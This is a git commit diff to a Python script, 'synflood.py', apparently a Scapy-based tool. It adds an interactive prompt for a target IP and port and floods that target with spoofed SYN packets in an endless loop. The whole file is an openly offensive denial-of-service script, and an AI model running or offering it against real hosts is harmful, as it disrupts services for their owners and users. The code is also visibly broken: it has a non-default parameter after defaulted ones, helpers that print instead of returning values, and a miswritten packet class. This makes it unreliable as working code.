68f55b6d1e79e3c6c32ad8ed13ff26c097c1aefa
Lorenzo Cunial <99892625+d3uk4li0n@users.noreply.github.com>
2024-02-15 10:58:13 +0100

    Update synflood.py

--- synflood.py
+++ synflood.py
@@ -10,11 +10,20 @@ def random_ip():
 def random_port():
     print(random.randrange(65535))
 
+## default values set for random ip and port
+## v = verbose
 def syn_flood(source=random_ip, target, tgt_port=random_port, v=0):
     ip = IP(src=source, dst=target)
     tcp = TCP(sport=random_port, dport=tgt_port, flags="S")
     raw_pkt = RAW(b"X"*1024)
     pkt = ip/tcp/raw_pkt
-    print(f"{Fore.GREEN}Flooding the target...")
+    print(f"{Fore.WHITE}Flooding the target...")
 
     send(pkt, loop=1, verbose=v)
+
+if __name__ == "__main__":
+    tgt = input(f"{Fore.BLUE}Insert target IP: ")
+    src = input(f"{Fore.BLUE}(Default random) Insert source IP: ")
+    port = int(input(f"{Fore.BLUE}(Default random) Insert target port: "))
+    vrb = int(input(f"{Fore.BLUE}(Default 0) [0|1] Verbose?"))
+    syn_flood(src, tgt, port, vrb)
